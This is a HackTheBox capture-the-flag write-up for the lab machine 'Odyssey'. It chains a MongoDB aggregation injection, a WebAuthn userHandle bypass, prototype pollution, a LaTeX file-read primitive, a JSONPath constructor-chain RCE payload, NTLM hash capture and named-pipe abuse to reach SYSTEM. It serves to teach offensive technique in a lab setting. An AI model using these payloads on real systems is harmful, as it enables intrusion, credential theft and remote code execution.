---
title: "Odyssey — HackTheBox Writeup"
date: 2026-07-29
authors:
  - pexpo
categories:
  - Web Exploitation
  - Windows
tags:
  - insane
  - webauthn
  - mongodb-injection
  - prototype-pollution
  - latex
  - jsonpath-rce
  - mssql
  - htb
slug: odyssey
description: "WebAuthn bypass → MongoDB injection → LaTeX file read → JSONPath RCE → MSSQL → Named pipe abuse"
---

# Odyssey — HackTheBox Writeup
**Difficulty:** Insane | **OS:** Windows

<!-- more -->

## Overview

Odyssey runs a Node.js Express app called AEGIS — a WebAuthn-based signing authority. The chain: WebAuthn registration with a fake credential → MongoDB `$facet` injection to leak invite tokens → userHandle confusion to login as admin → prototype pollution to enable raw LaTeX blocks → LaTeX file read for credentials → JSONPath injection RCE → MSSQL lateral movement → named pipe abuse for SYSTEM.

---

## Recon

```bash
sudo nmap -sC -sV -p- --min-rate 5000 -oN odyssey_tcp.txt <IP>
echo "<IP>  aegis.korvia.htb" | sudo tee -a /etc/hosts
```

Single port 3000 running Node.js Express. Redirects to `http://aegis.korvia.htb:3000/` — a WebAuthn SSO portal.

---

## MongoDB Injection — Invite Tokens

The MDS search endpoint passes `pipeline` directly to MongoDB aggregation. Used `$facet` + `$lookup` to cross-collection query `pending_invites`:

```bash
curl -s 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=
[{"$limit":1},{"$facet":{"x":[{"$lookup":{"from":"pending_invites","pipeline":[],"as":"y"}},
{"$unwind":"$y"},{"$replaceRoot":{"newRoot":"$y"}}]}}]'
```

Got invite token for `op-2026-0042`.

---

## WebAuthn Registration + userHandle Confusion

Generated EC keypair, built fake `authData` blob, sent as CBOR attestation to register without hardware key. During auth, sent `userHandle: base64("admin")` → logged in as admin regardless of which credential was proved.

---

## Prototype Pollution → LaTeX File Read

Sent `{"__proto__": {"allowRawBlocks": true}}` as a JSON string in the overrides field of the template render endpoint. Enabled raw LaTeX blocks in the pandoc pipeline. Used TeX primitives to read files:

```latex
\newread\foo \openin\foo=/etc/hostname \loop\unless\ifeof\foo \read\foo to\line \errmessage{\meaning\line}\repeat \closein\foo
```

Read `/etc/aegis-render.env` → got MSSQL credentials.

---

## JSONPath RCE

The MDS diagnostic endpoint evaluates JSONPath expressions. Used the constructor chain to escape:

```
$..[?(p="this.process.mainModule.require('child_process').exec('cmd')";Ethan=''[['constructor']][['constructor']](p);Ethan())]
```

Got shell as `webadmin`.

---

## MSSQL + Named Pipe → SYSTEM

Connected to internal MSSQL at `172.16.0.11` using env creds. Captured MSSQL service account NTLMv2 via UNC path in `BULK INSERT`. Got shell on Windows box. Found named pipe `AegisStreamMgmt` running as SYSTEM — sent HMAC-signed `CONFIG_IMPORT` frame with malicious YAML payload → RCE as SYSTEM → DCSync.

---

## Things I Learned

**MongoDB `$facet` for cross-collection injection** — incomplete filter at top level but sub-pipelines can still `$lookup` into other collections.

**WebAuthn userHandle confusion** — server used `userHandle` to identify the user without verifying it matched the credential. Sending `base64("admin")` bypassed auth entirely.

**LaTeX as file read primitive** — `\openin`, `\read`, `\errmessage` dumps file contents into pdflatex stderr without shell-escape.

**JSONPath constructor chain** — `''[['constructor']][['constructor']](code)()` reaches `Function()` without directly referencing blocked globals.
